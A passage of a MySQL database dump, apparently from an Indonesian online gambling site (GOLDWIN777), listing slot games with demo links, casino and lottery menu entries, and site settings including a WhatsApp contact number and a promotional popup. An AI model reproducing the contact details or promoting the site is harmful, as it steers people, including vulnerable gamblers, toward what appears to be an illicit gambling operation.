(27, 1, 'vs20farmfest.jpg', 'Barn Festival', 'barn_festival', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20farmfest&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(28, 1, 'vs20drtgold.jpg', 'Drill That Gold', 'drill_that_gold', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20drtgold&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(29, 1, 'vs10bookazteck.jpg', 'Book of Aztec King', 'book_of_aztec_king', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs10bookazteck&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(30, 1, 'vs25bullfiesta.jpg', 'Bull Fiesta', 'bull_fiesta', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs25bullfiesta&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(31, 1, 'vs25copsrobbers.jpg', 'Cash Patrol', 'cash_patrol', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs25copsrobbers&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(32, 1, 'vs20rainbowg.jpg', 'Rainbow Gold', 'rainbow_gold', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20rainbowg&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(33, 1, 'vs20bchprty.jpg', 'Wild Beach Party', 'wild_beach_party', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20bchprty&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(34, 1, 'vs10wildtut.jpg', 'Mysterious Egypt', 'mysterious_egypt', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs10wildtut&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(35, 1, 'vswayswerewolf.jpg', 'Curse Werewolf Megaways', 'curse_werewolf_megaways', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vswayswerewolf&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(36, 1, 'vswaysxjuicy.jpg', 'Extra Juicy Megaways', 'extra_juicy_megaways', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vswaysxjuicy&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(37, 1, 'vs50mightra.jpg', 'Might of Ra', 'might_of_ra', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs50mightra&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(38, 1, 'vs25gldox.jpg', 'Golden Ox', 'golden_ox', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs25gldox&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(39, 1, 'vswayselements.jpg', 'Elemental Gems Megaways', 'elemental_gems_megaways', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vswayselements&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(40, 1, 'vs10runes.jpg', 'Gates of Valhalla', 'gates_of_valhalla', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs10runes&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(41, 1, 'vs20colcashzone.jpg', 'Colossal Cash Zone', 'colossal_cash_zone', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20colcashzone&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(42, 1, 'vs20ultim5.jpg', 'The Ultimate 5', 'the_ultimate_5', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20ultim5&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(43, 1, 'vs40wanderw.jpg', 'Wild Depths', 'wild_depths', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs40wanderw&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(44, 1, 'vs243empcaishen.jpg', 'Emperor Caishen', 'emperor_caishen', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs243empcaishen&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(45, 1, 'vs4096magician.jpg', 'Magician Secrets', 'magician_secrets', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs4096magician&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(46, 1, 'vs25tigeryear.jpg', 'Lucky New Year Tiger', 'lucky_new_year_tiger', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs25tigeryear&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(47, 1, 'vs40pirgold.jpg', 'Pirate Gold Deluxe', 'pirate_gold_deluxe', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs40pirgold&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(48, 1, 'vs10goldfish.jpg', 'Fishin Reels', 'Fishin Reels', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs10goldfish&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(49, 1, 'vs40voodoo.jpg', 'VooDoo Magic', 'voodoo_magic', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs40voodoo&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(50, 1, 'vs88hockattack.jpg', 'Hockey Attack', 'hockey_attack', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs88hockattack&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(51, 1, 'vs5drmystery.jpg', 'Dragon Kingdom Eyes of Fire', 'dragon_kingdom_eyes_of_fire', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs5drmystery&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(52, 1, 'vswayscryscav.jpg', 'Crystal Caverns Megaways', 'crystal_caverns_megaways', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vswayscryscav&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(53, 1, 'vs10bblpop.jpg', 'Bubble Pop', 'bubble_pop', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs10bblpop&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(54, 1, 'vswayssamurai.jpg', 'Rise of Samurai Megaways', 'rise_of_samurai_megaways', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vswayssamurai&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(55, 1, 'vs20bermuda.jpg', 'Bermuda Riches', 'bermuda_riches', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20bermuda&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(56, 1, 'vswaysyumyum.jpg', 'Yum Yum Powerways', 'yum_yum_powerways', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vswaysyumyum&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(57, 1, 'vs20tweethouse.jpg', 'The Tweety House', 'the_tweety_house', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20tweethouse&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(58, 1, 'vs243chargebull.jpg', 'Raging Bull', 'raging_bull', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs243chargebull&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(59, 1, 'vs25walker.jpg', 'Wild Walker', 'wild_walker', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs25walker&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(60, 1, 'vswayslions.jpg', '5 Lions Megaways', '5_lions_megaways', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vswayslions&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(61, 1, 'vs20chickdrop.jpg', 'Chicken Drop', 'chiken_drop', '#link_asli', 'http://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20chickdrop&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(62, 1, 'vs10nudgeit.jpg', 'Rise of Giza', 'rise_of_giza', '#link_asli', 'http://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs10nudgeit&lang=en&cur=IDR&lobbyUrl=js://window.close()'),
(63, 1, 'vs20wildboost.jpg', 'Wild Booster', 'wild_booster', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20wildboost&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(64, 1, 'vs20starlight.jpg', 'Starlight Princess', 'starlight_princess', '#link_asli', 'http://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20starlight&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(65, 1, 'vs20pbonanza.jpg', 'Pyramid Bonanza', 'pyramid_bonanza', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20pbonanza&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(66, 1, 'vswayshammthor.jpg', 'Power Thor Megaways', 'power_thor_megaways', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vswayshammthor&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(67, 1, 'vs75bronco.jpg', 'Bronco Spirit', 'bronco_spirit', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs75bronco&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(68, 1, 'vs5joker.jpg', 'Joker Jewels', 'joker_jewels', '#link_asli', 'http://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs5joker&lang=en&cur=IDR&lobbyUrl=js://window.close()'),
(69, 1, 'vswaysbankbonz.jpg', 'Cash Bonanza', 'cash_bonanza', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vswaysbankbonz&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(70, 1, 'vs20doghouse.jpg', 'The Dog House', 'the_dog_house', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20doghouse&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(71, 1, 'vs5aztecgems.jpg', 'Aztec Gems', 'aztec_gems', '#link_asli', 'http://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs5aztecgems&lang=en&cur=IDR&lobbyUrl=js://window.close()'),
(72, 1, 'vs20magicpot.jpg', 'Magic Cauldron', 'magic_cauldron', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20magicpot&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(73, 1, 'vs20fparty2.jpg', 'Fruit Party 2', 'fruit_party_2', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20fparty2&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(74, 1, 'vs50juicyfr.jpg', 'Juicy Fruits', 'juicy_fruits', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs50juicyfr&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(75, 1, 'vswaysmadame.jpg', 'Madame Destiny Megaways', 'madame_destiny_megaways', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vswaysmadame&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(76, 1, 'vs20trsbox.jpg', 'Treasure Wild', 'treasure_wild', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20trsbox&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(77, 1, 'vs20sbxmas.jpg', 'Sweet Bonanza Xmas', 'sweet_bonanza_xmas', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20sbxmas&&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(78, 1, 'vswaysbufking.jpg', 'Buffalo King Megaways', 'buffalo_king_megaways', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vswaysbufking&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(79, 1, 'vs9aztecgemsdx.jpg', 'Aztec Gems Deluxe', 'aztec_gems_deluxe', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs9aztecgemsdx&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(80, 1, 'vs9piggybank.jpg', 'Piggy Bank Bill', 'piggy_bank_bill', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs9piggybank&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(81, 1, 'vs25jokerking.jpg', 'Joker King', 'joker_king', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs25jokerking&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(82, 1, 'vs10cowgold.jpg', 'Cowboys Gold', 'cowboys_gold', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs10cowgold&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(83, 1, 'vs20emptybank.jpg', 'Empty the Bank', 'empty_the_bank', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20emptybank&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(84, 1, 'vs20daydead.jpg', 'Day of Dead', 'day_of_dead', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20daydead&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(85, 1, 'vs20bonzgold.jpg', 'Bonanza Gold', 'bonanza_gold', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20bonzgold&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(86, 1, 'vs7776aztec.jpg', 'Aztec Bonanza', 'aztec_bonanza', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs7776aztec&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(87, 1, 'vswayswest.jpg', 'Mystic Chief', 'mystic_chief', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vswayswest&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(88, 1, 'vs20candvil.jpg', 'Candy Village', 'candy_village', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20candvil&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(89, 1, 'vswaysaztecking.jpg', 'Aztec King Megaways', 'aztec_king_megaways', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vswaysaztecking&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(90, 1, 'vs25hotfiesta.jpg', 'Hot Fiesta', 'hot_fiesta', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs25hotfiesta&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(91, 1, 'vs20midas.jpg', 'Hand of Midas', 'hand_of_midas', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20midas&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(92, 1, 'vswaysrhino.jpg', 'Great Rhino Megaways', 'great_rhino_megaways', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vswaysrhino&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(93, 1, 'vs20xmascarol.jpg', 'Christmas Carol Megaways', 'christmas_carol_megaways', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20xmascarol&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(94, 1, 'vs20fruitparty.jpg', 'Fruit Party', 'fruit_party', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20fruitparty&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(95, 1, 'vs25btygold.jpg', 'Bounty Gold', 'bounty_gold', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs25btygold&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(96, 1, 'vs20superx.jpg', 'Super X', 'super_x', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20superx&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(97, 1, 'vs25rio.jpg', 'Heart of Rio', 'heart_of_rio', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs25rio&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(98, 1, 'vs20santawonder.jpg', 'Santa Wonderland', 'santa_wonderland', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20santawonder&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(99, 1, 'vs243fortune.jpg', 'Caishen Gold', 'caishen_gold', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs243fortune&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(100, 1, 'vswaysdogs.jpg', 'The Dog House Megaways', 'the_dog_house_megaways', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vswaysdogs&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(101, 1, 'vs15diamond.jpg', 'Diamond Strike', 'diamond_strike', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs15diamond&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(102, 1, 'vs20goldfever.jpg', 'Gems Bonanza', 'gems_bonanza', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20goldfever&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(103, 1, 'vswayschilheat.jpg', 'Chilli Heat Megaways', 'chilli_heat_megaways', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vswayschilheat&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(104, 1, 'vs10bookfallen.jpg', 'Book of the Fallen', 'book_of_the_fallen', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs10bookfallen&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(105, 1, 'vs25pandatemple.jpg', 'Panda Fortune 2', 'panda_fortune_2', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs25pandatemple&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(106, 1, 'vs20smugcove.jpg', 'Smugglers Cove', 'smugglers_cove', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20smugcove&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(107, 1, 'vs20kraken.jpg', 'Release the Kraken', 'release_the_kraken', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20kraken&lang=id&cur=IDR&lobbyUrl=js://window.close()');

-- --------------------------------------------------------

--
-- Table structure for table `menu_games`
--

CREATE TABLE `menu_games` (
  `id_menu_games` int(11) NOT NULL,
  `judul_menu_games` varchar(255) NOT NULL,
  `link_menu_games` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `menu_games`
--

INSERT INTO `menu_games` (`id_menu_games`, `judul_menu_games`, `link_menu_games`) VALUES
(1, 'Slots', 'slots'),
(2, 'Live Casino', 'live_casino'),
(3, 'Sports', 'sports'),
(4, 'Arcade', 'arcade'),
(5, 'Poker', 'poker'),
(6, 'Togel', 'togel');

-- --------------------------------------------------------

--
-- Table structure for table `pengaturan`
--

CREATE TABLE `pengaturan` (
  `id_pengaturan` int(11) NOT NULL,
  `nama_pengaturan` varchar(255) NOT NULL,
  `isi1_pengaturan` text NOT NULL,
  `isi2_pengaturan` text NOT NULL,
  `isi3_pengaturan` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `pengaturan`
--

INSERT INTO `pengaturan` (`id_pengaturan`, `nama_pengaturan`, `isi1_pengaturan`, `isi2_pengaturan`, `isi3_pengaturan`) VALUES
(1, 'livechat', '5318685199_whatsapp_image_2024-03-03_at_04.17.31.jpeg', 'Dukungan LiveChat 24 Jam', 'https://secure.livechatinc.com/customer/action/open_chat?license_id=17174376'),
(2, 'whatsapp', '5725617450_whatsapp_image_2024-03-03_at_04.18.41.jpeg', '+6283849583314', 'Text Whatsapp'),
(3, 'footer', '&nbsp;', '    ', ''),
(4, 'line', 'GOLDWIN777', '#', ''),
(5, 'twitter', 'GOLDWIN777', '#', ''),
(6, 'instagram', 'GOLDWIN777', '#', ''),
(7, 'facebook', 'GOLDWIN777', '#', ''),
(8, 'livescore', 'lainnya-1.gif', 'link_livescore', ''),
(9, 'rtp_slot', '3333296433_fygjkjklpiouibhjbkl.gif', 'link_rtp_slot', ''),
(10, 'popup_pengumuman', '5840365206_3002175154_img_7896.gif', 'home', '<h4 style=\"text-align: justify; \"><b style=\"font-size: 13px; background-color: var(--vz-card-bg); text-align: var(--vz-body-text-align);\"><font color=\"#000000\">KONTAK RESMI KAMI HANYA DI :</font></b></h4><div><span style=\"font-size: 13px;\"><b><font color=\"#000000\">WHATSAPP : </font><font color=\"#bd9400\">https://wa.me/+6283849583314</font></b></span></div><div><font color=\"#000000\"><br></font></div><div><span style=\"font-size: 13px;\"><b><font color=\"#000000\">SALAM JACKPOT</font></b></span></div><div><span style=\"font-size: 13px;\"><b><font color=\"#000000\"><br></font></b></span></div><div><span style=\"font-size: 13px;\"><b style=\"\"><font color=\"#000000\">PASTIKAN CEK REKENING DEPOSIT DI SITUS 